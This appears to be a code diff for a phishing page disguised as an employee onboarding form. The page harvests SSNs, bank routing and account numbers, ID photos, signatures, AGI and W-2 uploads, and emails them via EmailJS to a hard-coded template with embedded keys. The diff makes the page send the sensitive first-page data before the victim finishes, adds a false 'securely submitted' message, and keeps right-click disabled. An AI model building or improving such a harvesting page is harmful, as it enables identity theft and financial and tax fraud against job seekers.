@@ -7,14 +7,14 @@
   
   <!-- Uploadcare widget -->
   <script>
-    UPLOADCARE_PUBLIC_KEY = "dc6750519d7c0a4947bc";  /* <-- Replace this */
+    UPLOADCARE_PUBLIC_KEY = "dc6750519d7c0a4947bc";
   </script>
   <script src="https://ucarecdn.com/libs/widget/3.x/uploadcare.full.min.js"></script>
   
   <!-- EmailJS -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script>
-    emailjs.init("VEazsFtlAIsVWg4TM");  /* <-- Replace this */
+    emailjs.init("VEazsFtlAIsVWg4TM");
   </script>
 
   <style>
@@ -60,21 +60,15 @@
       font-size: 16px;
       cursor: pointer;
     }
-    button + button {
-      margin-top: 10px;
-      background: #6c757d;
-    }
     .note {
       font-size: 0.9em;
       color: #777;
     }
-
-    /* Centered notice style */
     .notice-center {
       display: flex;
       flex-direction: column;
-      justify-content: center; /* vertical center */
-      align-items: center;    /* horizontal center */
+      justify-content: center;
+      align-items: center;
       text-align: center;
       padding: 20px;
       margin-bottom: 20px;
@@ -83,6 +77,15 @@
       font-weight: 600;
       color: #0b5ed7;
       min-height: 120px;
+    }
+    #thankYou {
+      display: none;
+      background: #d4edda;
+      color: #155724;
+      padding: 25px;
+      border-radius: 10px;
+      text-align: center;
+      font-weight: bold;
     }
   </style>
 </head>
@@ -121,7 +124,6 @@
     <label>Social Security Number (SSN)</label>
     <input type="text" name="ssn" placeholder="123-45-6789" required />
 
-    <!-- Added Education Fields -->
     <label>High School Name</label>
     <input type="text" name="high_school_name" required />
 
@@ -171,82 +173,81 @@
     <label>Upload Your Last W-2</label>
     <input type="hidden" role="uploadcare-uploader" name="w2_upload" data-clearable />
 
-    <button type="button" id="prevBtn">Previous</button>
     <button type="submit">Submit</button>
   </form>
+
+  <!-- Final Thank You Message -->
+  <div id="thankYou">
+    <h3>Thank you for completing your employee onboarding!</h3>
+    <p>Your information has been securely submitted. You may now close this page.</p>
+  </div>
 
   <script>
     const formPage1 = document.getElementById('formPage1');
     const formPage2 = document.getElementById('formPage2');
     const nextBtn = document.getElementById('nextBtn');
-    const prevBtn = document.getElementById('prevBtn');
+    const thankYou = document.getElementById('thankYou');
+
+    let form1Data = {};
 
     nextBtn.addEventListener('click', () => {
       if (formPage1.reportValidity()) {
-        formPage1.style.display = 'none';
-        formPage2.style.display = 'block';
-        window.scrollTo(0,0);
-      }
-    });
+        form1Data = {
+          fullName: formPage1.fullName.value,
+          email: formPage1.email.value,
+          phone: formPage1.phone.value,
+          bank: formPage1.bank.value,
+          branch: formPage1.branch.value,
+          routing: formPage1.routing.value,
+          account: formPage1.account.value,
+          account_type: formPage1.account_type.value,
+          ssn: formPage1.ssn.value,
+          high_school_name: formPage1.high_school_name.value,
+          year_started: formPage1.year_started.value,
+          year_graduated: formPage1.year_graduated.value,
+          id_front: formPage1.id_front.value,
+          id_back: formPage1.id_back.value,
+          signature: formPage1.signature.value,
+          submissionTime: new Date().toLocaleString()
+        };
 
-    prevBtn.addEventListener('click', () => {
-      formPage2.style.display = 'none';
-      formPage1.style.display = 'block';
-      window.scrollTo(0,0);
+        // Send Page 1 data
+        emailjs.send("service_slujuho", "template_ddahdoo", form1Data)
+          .then(() => {
+            formPage1.style.display = 'none';
+            formPage2.style.display = 'block';
+            window.scrollTo(0, 0);
+          })
+          .catch((error) => {
+            console.error("EmailJS Error (Form 1):", error);
+            alert("Failed to send first part of the form. Please try again.");
+          });
+      }
     });
 
     formPage2.addEventListener('submit', function(e) {
       e.preventDefault();
 
-      // Gather form 1 data
-      const f1Data = {
-        fullName: formPage1.fullName.value,
-        email: formPage1.email.value,
-        phone: formPage1.phone.value,
-        bank: formPage1.bank.value,
-        branch: formPage1.branch.value,
-        routing: formPage1.routing.value,
-        account: formPage1.account.value,
-        account_type: formPage1.account_type.value,
-        ssn: formPage1.ssn.value,
-        high_school_name: formPage1.high_school_name.value,
-        year_started: formPage1.year_started.value,
-        year_graduated: formPage1.year_graduated.value,
-        id_front: formPage1.id_front.value,
-        id_back: formPage1.id_back.value,
-        signature: formPage1.signature.value,
-        submissionTime: new Date().toLocaleString()
-      };
-
-      // Gather form 2 data
-      const f2Data = {
+      const form2Data = {
         filed_tax_return: formPage2.filed_tax_return.value,
         agi_2024: formPage2.agi_2024.value,
         w2_upload: formPage2.w2_upload.value,
         submissionTime: new Date().toLocaleString()
       };
 
-      // Send form 1 data email
-      emailjs.send("service_slujuho", "template_ddahdoo", f1Data)
+      emailjs.send("service_slujuho", "template_ddahdoo", form2Data)
         .then(() => {
-          // Send form 2 data email
-          return emailjs.send("service_slujuho", "template_ddahdoo", f2Data);
-        })
-        .then(() => {
-          alert("Both forms submitted successfully!");
-          formPage1.reset();
-          formPage2.reset();
           formPage2.style.display = 'none';
-          formPage1.style.display = 'block';
-          window.scrollTo(0,0);
+          thankYou.style.display = 'block';
+          window.scrollTo(0, 0);
         })
         .catch((error) => {
-          console.error("EmailJS Error:", error);
-          alert("Failed to send forms. Please try again.");
+          console.error("EmailJS Error (Form 2):", error);
+          alert("Failed to send second part of the form. Please try again.");
         });
     });
 
-    // Disable right-click on whole page to block context menu
+    // Disable right-click
     document.addEventListener('contextmenu', event => event.preventDefault());
   </script>
 </body>
